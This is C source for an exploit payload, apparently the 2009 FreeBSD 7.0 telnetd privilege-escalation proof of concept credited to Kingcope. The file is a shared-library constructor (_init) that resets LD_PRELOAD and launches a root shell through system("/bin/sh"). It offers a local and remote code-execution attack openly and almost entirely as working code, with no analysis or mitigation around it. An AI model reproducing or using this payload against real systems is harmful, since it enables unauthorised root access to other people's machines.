# FreeBSD telnetd local/remote privilege escalation/code execution
# remote root only when accessible ftp or similar available
# tested on FreeBSD 7.0-RELEASE
# by Kingcope/2009

#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        FILE *f;
        setenv("LD_PRELOAD", "", 1);
        system("echo ALEX-ALEX;/bin/sh");
}
